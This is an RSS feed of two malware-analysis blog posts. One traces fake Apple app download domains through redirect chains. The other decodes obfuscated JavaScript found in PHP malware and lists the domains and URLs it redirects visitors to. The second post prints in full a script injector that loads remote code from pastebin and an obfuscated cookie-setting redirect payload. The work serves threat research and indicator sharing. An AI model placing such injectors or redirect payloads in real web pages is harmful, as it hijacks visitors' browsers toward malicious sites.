<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Malware Analysis on Floyd</title><link>https://hightower.space/tags/malware-analysis/</link><description>Recent content in Malware Analysis on Floyd</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://hightower.space/tags/malware-analysis/index.xml" rel="self" type="application/rss+xml"/><item><title>Fake Apple App Download Sites</title><link>https://hightower.space/posts/fake-apple-app-download-sites/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/fake-apple-app-download-sites/</guid><description>&lt;p>&lt;strong>Note:&lt;/strong> All URLs/domains in this post are &lt;a href="https://ioc-fanger.hightower.space/#overview">defanged&lt;/a>. You can fang/defang them &lt;a href="https://ioc-fanger.hightower.space/#use-the-package-live">here&lt;/a>.&lt;/p>
&lt;p>I was investigating how to use &lt;a href="https://elinux.org/X11">x11&lt;/a> to serve a GUI running inside a docker container for an &lt;a href="https://github.com/fhightower/nand2tetris">nand2tetris&lt;/a> project I&amp;rsquo;m working on and I found a collection of domains serving fake Apple app downloads:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://loadsea[.]heredoggi[.]com/x11-forwarding-for-mac/
hXXps://moraea[.]batteryscience[.]us/location-of-x11-libraries-mac-os/
hXXps://letdwnl[.]brittanythomassigler[.]us/mac-os-x11-app/
hXXps://gogo[.]sunshinebeagles[.]us/mac-x11-manual-pdf-5252/
hXXps://isabelmaries[.]co/xquartz-alternative/
hXXps://holidayshunter[.]naturalwatches[.]co/x11-forwarding-for-mac/
&lt;/code>&lt;/pre>&lt;p>Most of these redirect to a URL like:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://viperctum[.]info/go[.]php?url=https%3A%2F%2Fcdn[.]ketamo[.]info%2F%3Fa%3D337
89%26c%3D303745%26s1%3D111%26s2%3D1411c3vzwslb4a16%26s3%3DX11%2BForwarding%2BFor%2BM
ac&amp;amp;uclick=3vzwslb4
&lt;/code>&lt;/pre>&lt;p>Which, decoded, looks like:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://viperctum[.]info/go[.]php?url=hXXps://cdn[.]ketamo[.]info/?a=33789&amp;amp;c=303745
&amp;amp;s1=111&amp;amp;s2=1411c3vzwslb4a16&amp;amp;s3=X11+Forwarding+For+Mac&amp;amp;uclick=3vzwslb4
&lt;/code>&lt;/pre>&lt;p>When followed, this link goes to:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://www[.]pdf4mac[.]com/?czfjp=1296&amp;amp;e=2647&amp;amp;a=4389&amp;amp;f=pb&amp;amp;r=d2c78a53d92d4e789ead565
5b694d7101c8b4
&lt;/code>&lt;/pre>&lt;p>Which contains a download for &lt;a href="https://www.virustotal.com/gui/file/856f233ee7363c0297a4f84e8783cdae0098ada0241009957dea433ebe1270de">this&lt;/a>, undetected file.&lt;/p></description></item><item><title>Analysis of Obfuscated PHP Malware</title><link>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</link><pubDate>Tue, 29 Jan 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</guid><description>&lt;p>&lt;i>Updated on February 27, 2019.&lt;/i>&lt;/p>
&lt;p>I am monitoring the php decoder site &lt;a href="https://malwaredecoder.com/">here&lt;/a> and was alerted when the decoded php &lt;a href="https://malwaredecoder.com/result/2333ee92d6f6872f6b5e685a9f4b3ed3">here&lt;/a> had a &lt;code>String.fromCharCode&lt;/code> command in it. After decoding the character code (&lt;code>104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112&lt;/code>)&lt;!-- &lt;sup>1&lt;/sup> -->, this produced &lt;code>https://getmyconfigplease[.]com/get[.]php&lt;/code>. The content of this site looks like:&lt;/p>
&lt;pre tabindex="0">&lt;code>var sECIQY8TzC = document.createElement(&amp;#39;script&amp;#39;); sECIQY8TzC.type = &amp;#39;text/javascript&amp;#39;; sECIQY8TzC.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78); document.head.appendChild(sECIQY8TzC);
&lt;/code>&lt;/pre>&lt;p>Decoding the &lt;code>String.fromCharCode&lt;/code> bit&lt;!-- &lt;sup>2&lt;/sup> --> produces &lt;code>https://pastebin.com/raw/EnNKqGLN&lt;/code>.&lt;/p>
&lt;!-- &lt;aside class="marginnote">
&lt;p>&lt;span class="noteNumber">1&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112])&lt;/code>&lt;/p>
&lt;p>&lt;span class="noteNumber">2&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78])&lt;/code>&lt;/p>
&lt;/aside> -->
&lt;p>The content of this site is:&lt;/p>
&lt;pre tabindex="0">&lt;code>function _0x16ac9e(){var _0x11da69=[&amp;#39;MHgy&amp;#39;,&amp;#39;MHgz&amp;#39;,&amp;#39;MHg0&amp;#39;,&amp;#39;MHg2&amp;#39;,&amp;#39;aHJlZg==&amp;#39;,&amp;#39;cmVwbGFjZQ==&amp;#39;,&amp;#39;bG9jYXRpb24=&amp;#39;,&amp;#39;aW5kZXhPZg==&amp;#39;,&amp;#39;Y29va2ll&amp;#39;,&amp;#39;QmVzdENvb2tpZT10cnVlOyBtYXgtYWdlPTIwNDAw&amp;#39;,&amp;#39;c2hpZnQ=&amp;#39;,&amp;#39;MHgw&amp;#39;,&amp;#39;MHgx&amp;#39;];(function(_0x538417,_0x48f8ea){var _0x350dbc=function(_0x2e576b){while(--_0x2e576b){_0x538417[&amp;#39;push&amp;#39;](_0x538417[&amp;#39;shift&amp;#39;]());}};_0x350dbc(++_0x48f8ea);}(_0x11da69,0xd5));var _0x4097a7=function(_0x506a3d,_0x321114){_0x506a3d=_0x506a3d-0x0;var _0x32b6f7=_0x11da69[_0x506a3d];if(_0x4097a7[&amp;#39;cNcBaR&amp;#39;]===undefined){(function(){var _0x29eb7d;try{var _0x4e84d1=Function(&amp;#39;return\x20(function()\x20&amp;#39;+&amp;#39;{}.constructor(\x22return\x20this\x22)(\x20)&amp;#39;+&amp;#39;);&amp;#39;);_0x29eb7d=_0x4e84d1();}catch(_0x476c5c){_0x29eb7d=window;}var _0x3b1078=&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#39;;_0x29eb7d[&amp;#39;atob&amp;#39;]||(_0x29eb7d[&amp;#39;atob&amp;#39;]=function(_0x2199f9){var _0x207876=String(_0x2199f9)[&amp;#39;replace&amp;#39;](/=+$/,&amp;#39;&amp;#39;);for(var _0x3d686c=0x0,_0x55acec,_0x22a388,_0x5795eb=0x0,_0x5c30ef=&amp;#39;&amp;#39;;_0x22a388=_0x207876[&amp;#39;charAt&amp;#39;](_0x5795eb++);~_0x22a388&amp;amp;&amp;amp;(_0x55acec=_0x3d686c%0x4?_0x55acec*0x40+_0x22a388:_0x22a388,_0x3d686c++%0x4)?_0x5c30ef+=String[&amp;#39;fromCharCode&amp;#39;](0xff&amp;amp;_0x55acec&amp;gt;&amp;gt;(-0x2*_0x3d686c&amp;amp;0x6)):0x0){_0x22a388=_0x3b1078[&amp;#39;indexOf&amp;#39;](_0x22a388);}return _0x5c30ef;});}());_0x4097a7[&amp;#39;qogRBP&amp;#39;]=function(_0xd61dcf){var _0x10ae9e=atob(_0xd61dcf);var _0x3a9531=[];for(var _0x3a6320=0x0,_0x8d019b=_0x10ae9e[&amp;#39;length&amp;#39;];_0x3a6320&amp;lt;_0x8d019b;_0x3a6320++){_0x3a9531+=&amp;#39;%&amp;#39;+(&amp;#39;00&amp;#39;+_0x10ae9e[&amp;#39;charCodeAt&amp;#39;](_0x3a6320)[&amp;#39;toString&amp;#39;](0x10))[&amp;#39;slice&amp;#39;](-0x2);}return decodeURIComponent(_0x3a9531);};_0x4097a7[&amp;#39;KYlgqs&amp;#39;]={};_0x4097a7[&amp;#39;cNcBaR&amp;#39;]=!![];}var _0x579681=_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d];if(_0x579681===undefined){_0x32b6f7=_0x4097a7[&amp;#39;qogRBP&amp;#39;](_0x32b6f7);_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d]=_0x32b6f7;}else{_0x32b6f7=_0x579681;}return _0x32b6f7;};var _0x2be368=[_0x4097a7(&amp;#39;0x0&amp;#39;),_0x4097a7(&amp;#39;0x1&amp;#39;),&amp;#39;fromCharCode&amp;#39;,&amp;#39;BestCookie=true&amp;#39;,_0x4097a7(&amp;#39;0x2&amp;#39;),_0x4097a7(&amp;#39;0x3&amp;#39;),_0x4097a7(&amp;#39;0x4&amp;#39;)];(function(_0x6e5b15,_0x2c75a3){var _0x42951f=function(_0x1975b5){while(--_0x1975b5){_0x6e5b15[&amp;#39;push&amp;#39;](_0x6e5b15[_0x4097a7(&amp;#39;0x5&amp;#39;)]());}};_0x42951f(++_0x2c75a3);}(_0x2be368,0x1c9));var _0x4755cb=function(_0x5ad1ee,_0x39c6df){_0x5ad1ee=_0x5ad1ee-0x0;var _0x38bd4b=_0x2be368[_0x5ad1ee];return _0x38bd4b;};var _0x443bde=[_0x4755cb(_0x4097a7(&amp;#39;0x6&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x7&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x8&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x9&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0xa&amp;#39;)),_0x4755cb(&amp;#39;0x5&amp;#39;),_0x4755cb(_0x4097a7(&amp;#39;0xb&amp;#39;)),_0x4097a7(&amp;#39;0xc&amp;#39;)];var _0x4efd8b=String[_0x443bde[0x0]](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70);if(document[_0x443bde[0x3]][_0x443bde[0x2]](_0x443bde[0x1])==-0x1){document[_0x443bde[0x3]]=_0x443bde[0x4];window[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);document[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);window[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;document[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;}}_0x16ac9e();
&lt;/code>&lt;/pre>&lt;h3 id="update-february-27-2019">Update (February 27, 2019)&lt;/h3>
&lt;p>&lt;em>The content below was added on February 27, 2019.&lt;/em>&lt;/p>
&lt;p>Upon further investigation, the code above contains the interesting snippet:&lt;/p>
&lt;pre tabindex="0">&lt;code>(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70)
&lt;/code>&lt;/pre>&lt;p>This hex that decodes to:&lt;/p>
&lt;pre tabindex="0">&lt;code>https://formylittlesite.xyz/little.php
&lt;/code>&lt;/pre>&lt;p>Visitors to this site will be redirected to a URL on one of the following domains (the full URLs are listed below):&lt;/p>
&lt;pre tabindex="0">&lt;code>appelertte.tk
atlanta-rostov.ru
avtonewsmir.ru
avtoservis5plus.ru
avtowoldsnews.ru
creditforms.site
edu-fddu.info
giner.online
greencool.icu
informzine.site
lentube.host
merkuriu.icu
picturesun.top
rriverrponse.tk
sarriverdoma.tk
school-fix-news.info
storics.info
studentachieve.tk
visnu.icu
www.twero.com
&lt;/code>&lt;/pre>&lt;p>Here are the URLs to which I was redirected:&lt;/p>
&lt;pre tabindex="0">&lt;code>http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=261
http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://atlanta-rostov.ru/2018/12/26/ken-shamrock-vs-kimbo-slice-full-fight/
http://atlanta-rostov.ru/2018/12/27/rhythmbox-vs-banshee/
http://atlanta-rostov.ru/latest.php
http://avtonewsmir.ru/the-best-stock-photos/
http://avtoservis5plus.ru/main-credit-reporting-agencies/
http://avtowoldsnews.ru/forex-trading-for-dummies-2013-pdf/
http://avtowoldsnews.ru/latest.php
http://creditforms.site/average-car-insurance-rates-florida/
http://creditforms.site/latest.php
http://creditforms.site/the-carburetors/
http://edu-fddu.info/blog/latest.php
http://giner.online/can-you-apply-for-more-than-one-credit-card/
http://greencool.icu/blog/?p=502
http://greencool.icu/blog/latest.php
http://informzine.site/2018/12/26/papigfunk/
http://informzine.site/latest.php
http://lentube.host/forex-trading-tutorials/
http://lentube.host/latest.php
http://lentube.host/top-forex-traders-in-the-world-2017/
http://lentube.host/what-is-a-broker-forex-nu3p/
http://merkuriu.icu/blog/?p=446
http://picturesun.top/blog/?p=102
http://picturesun.top/blog/?p=104
http://picturesun.top/blog/?p=125
http://picturesun.top/blog/?p=13
http://picturesun.top/blog/?p=1348
http://picturesun.top/blog/?p=1357
http://picturesun.top/blog/?p=1382
http://picturesun.top/blog/?p=1416
http://picturesun.top/blog/?p=1444
http://picturesun.top/blog/?p=1485
http://picturesun.top/blog/?p=149
http://picturesun.top/blog/?p=1494
http://picturesun.top/blog/?p=1499
http://picturesun.top/blog/?p=1509
http://picturesun.top/blog/?p=1537
http://picturesun.top/blog/?p=1553
http://picturesun.top/blog/?p=156
http://picturesun.top/blog/?p=1566
http://picturesun.top/blog/?p=158
http://picturesun.top/blog/?p=1589
http://picturesun.top/blog/?p=1600
http://picturesun.top/blog/?p=1611
http://picturesun.top/blog/?p=1631
http://picturesun.top/blog/?p=1651
http://picturesun.top/blog/?p=1655
http://picturesun.top/blog/?p=1658
http://picturesun.top/blog/?p=1667
http://picturesun.top/blog/?p=1675
http://picturesun.top/blog/?p=1690
http://picturesun.top/blog/?p=1694
http://picturesun.top/blog/?p=174
http://picturesun.top/blog/?p=178
http://picturesun.top/blog/?p=18
http://picturesun.top/blog/?p=183
http://picturesun.top/blog/?p=209
http://picturesun.top/blog/?p=213
http://picturesun.top/blog/?p=226
http://picturesun.top/blog/?p=242
http://picturesun.top/blog/?p=252
http://picturesun.top/blog/?p=256
http://picturesun.top/blog/?p=268
http://picturesun.top/blog/?p=274
http://picturesun.top/blog/?p=280
http://picturesun.top/blog/?p=306
http://picturesun.top/blog/?p=312
http://picturesun.top/blog/?p=314
http://picturesun.top/blog/?p=334
http://picturesun.top/blog/?p=348
http://picturesun.top/blog/?p=354
http://picturesun.top/blog/?p=374
http://picturesun.top/blog/?p=376
http://picturesun.top/blog/?p=380
http://picturesun.top/blog/?p=382
http://picturesun.top/blog/?p=396
http://picturesun.top/blog/?p=404
http://picturesun.top/blog/?p=418
http://picturesun.top/blog/?p=426
http://picturesun.top/blog/?p=430
http://picturesun.top/blog/?p=448
http://picturesun.top/blog/?p=452
http://picturesun.top/blog/?p=458
http://picturesun.top/blog/?p=470
http://picturesun.top/blog/?p=476
http://picturesun.top/blog/?p=480
http://picturesun.top/blog/?p=484
http://picturesun.top/blog/?p=500
http://picturesun.top/blog/?p=513
http://picturesun.top/blog/?p=517
http://picturesun.top/blog/?p=523
http://picturesun.top/blog/?p=527
http://picturesun.top/blog/?p=529
http://picturesun.top/blog/?p=531
http://picturesun.top/blog/?p=537
http://picturesun.top/blog/?p=541
http://picturesun.top/blog/?p=543
http://picturesun.top/blog/?p=545
http://picturesun.top/blog/?p=551
http://picturesun.top/blog/?p=557
http://picturesun.top/blog/?p=565
http://picturesun.top/blog/?p=567
http://picturesun.top/blog/?p=569
http://picturesun.top/blog/?p=573
http://picturesun.top/blog/?p=575
http://picturesun.top/blog/?p=622
http://picturesun.top/blog/?p=86
http://picturesun.top/blog/?p=92
http://picturesun.top/blog/?p=96
http://picturesun.top/blog/latest.php
http://rriverrponse.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://sarriverdoma.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://school-fix-news.info/2019/01/09/car-accident-my-fault-will-my-insurance-go-up/
http://storics.info/2018/12/27/business-credit-cards-for-bad-credit/
http://storics.info/2018/12/27/cheapest-home-equity-line-of-credit/
http://storics.info/2018/12/27/paid-in-full-on-credit-report/
http://storics.info/2018/12/27/wipe-credit-clean/
http://storics.info/latest.php
http://visnu.icu/philadelphia-indemnity-car-insurance/
https://www.twero.com/en/profiles?p=1027797&amp;amp;pi=test1&amp;amp;_=1548965393
&lt;/code>&lt;/pre>&lt;p>I intend to more investigation on the registrant information for these domains at some point and will keep you posted!&lt;/p></description></item></channel></rss>